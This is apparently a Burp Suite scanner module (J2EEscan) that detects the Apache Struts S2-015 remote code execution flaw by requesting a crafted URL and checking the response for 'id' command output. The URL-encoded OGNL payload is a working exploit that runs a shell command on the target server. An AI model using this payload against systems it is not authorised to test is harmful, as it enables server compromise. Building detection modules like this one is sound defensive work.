package burp.j2ee.issues.impl;

import burp.*;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class StrutsS2015 implements IModule {
    private static final String TITLE = "Struts S2-015 RCE (Reflect)";
    private static final String DESCRIPTION = "J2EEscan identified Struts S2-015 Reflected RCE in the webpage"
            + "<b>References</b>:<br /><br />"
            + "http://struts.apache.org/docs/s2-015.html<br />"
            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-015<br />"
            + "https://github.com/ronoski/VulApps/tree/master/s/struts2/s2-015";

    private static final String REMEDY = "Upgrade to latest Apache Struts version";

    private static final List<Pattern> UID_REGEX = Arrays.asList(
            Pattern.compile("uid%3D[0-9]+.*gid%3D[0-9]+.", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));

    private PrintWriter stderr;
    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        stderr = new PrintWriter(callbacks.getStderr(), true);
        List<IScanIssue> issues = new ArrayList<>();

        String payload_template = "%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%2C%23q%7D.action";
        IExtensionHelpers helpers = callbacks.getHelpers();

        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        URL curURL = reqInfo.getUrl();

        String protocol = curURL.getProtocol();
        String host = curURL.getHost();
        int port = curURL.getPort();
        String path = curURL.getPath();
        if(path.endsWith("/")){
            try{
                URL newURL = new URL(protocol, host, port,  path + payload_template);
                byte[] newMessage = helpers.buildHttpRequest(newURL);
                IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),
                        newMessage);

                //stderr.println(newURL.toString()); //debug message
                String response = helpers.bytesToString(checkRequestResponse.getResponse());
                for (Pattern xincludeMatcher : UID_REGEX) {

                    Matcher matcher = xincludeMatcher.matcher(response);

                    if (matcher.find()) {
                        issues.add(new CustomScanIssue(
                                baseRequestResponse.getHttpService(),
                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                checkRequestResponse,
                                TITLE,
                                DESCRIPTION,
                                REMEDY,
                                Risk.High,
                                Confidence.Firm
                        ));
                        return issues;
                    }
                }

            }catch (MalformedURLException ex) {
                stderr.println("Error creating URL " + ex.getMessage());
            }
        }


        return issues;
    }
}
